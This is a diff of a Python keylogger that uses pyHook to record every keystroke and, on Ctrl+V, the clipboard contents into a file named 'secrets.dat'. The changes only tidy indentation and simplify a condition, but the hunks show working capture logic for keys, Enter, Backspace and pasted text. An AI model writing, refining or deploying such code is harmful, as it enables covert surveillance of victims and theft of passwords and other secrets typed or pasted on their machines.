@@ -11,11 +11,11 @@ f_name = "secrets.dat"
 def keypressed(event):
     global data
     if event.Ascii == 13:
-            keys = '\n'
-            fp = open(f_name,'a')
-            data = keys            
-            fp.write(data)
-            fp.close()
+        keys = '\n'
+        fp = open(f_name,'a')
+        data = keys            
+        fp.write(data)
+        fp.close()
     elif event.Ascii == 8:
             keys = '<BS>'
             fp = open(f_name,'a')
@@ -34,8 +34,8 @@ def keypressed(event):
             data = keys
             fp.write(data + "\n")
             fp.close()
-    elif event.Ascii == 1 or event.Ascii == 3 or event.Ascii == 19 or event.Ascii == 0 or event.Ascii == 24:
-            pass
+    elif event.Ascii in [1, 3, 19, 0, 24]:
+        pass
     elif event.Ascii == 22:
             keys = pyperclip.paste()
             fp = open(f_name,'a')
@@ -45,11 +45,11 @@ def keypressed(event):
             fp.write("###########STOP  CLIPBOARD#############\n")
             fp.close()
     else:
-            keys = chr(event.Ascii)
-            fp = open(f_name,'a')
-            data = keys
-            fp.write(data)
-            fp.close()
+        keys = chr(event.Ascii)
+        fp = open(f_name,'a')
+        data = keys
+        fp.write(data)
+        fp.close()
 
 def log_it():
     obj = pyHook.HookManager()
